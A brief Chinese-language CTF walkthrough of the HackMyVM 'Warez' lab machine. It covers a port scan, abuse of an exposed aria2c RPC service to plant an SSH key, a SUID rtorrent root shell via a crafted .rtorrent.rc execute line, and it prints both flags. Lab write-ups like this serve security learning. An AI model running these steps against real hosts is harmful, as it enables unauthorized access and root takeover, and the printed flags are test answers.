# Warez

2024.12.31 https://hackmyvm.eu/machines/machine.php?vm=Warez

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6800/tcp open  unknown
```

查看 80 web 服务，扫描目录发现 http://192.168.5.40/result.txt 其中有一些系统进程的日志，能发现一个用户名 carolina :

```
carolina     394  0.0  0.0   2420   576 ?        Ss   02:42   0:00 /bin/sh -c aria2c --enable-rpc --rpc-listen-all
carolina     395  0.0  1.4  56736 14464 ?        S    02:42   0:00 aria2c --enable-rpc --rpc-listen-all
```

发现 aria2c 是以 carolina 用户在运行。

访问 http://192.168.5.40/ 发现 aria2c 的下载目录是在 /home/carolina , 所以直接创建 ssh 的连接密钥，然后通过 aria2c 下载到目标机器将生成的公钥下载到目标机器的.ssh/authorized_keys 文件中。

通过 ssh 登陆到目标机器：

```
ssh -i ssh carolina@192.168.5.40
```

先获得了 user flag:

```
carolina@warez:~$ cat user.txt
HMVKeepdownloading
```

提权到 root，发现 suid 程序 rtorrent 直接提权：

```
echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
rtorrent

# cat /root/root.txt
HMVKeepsharing
```
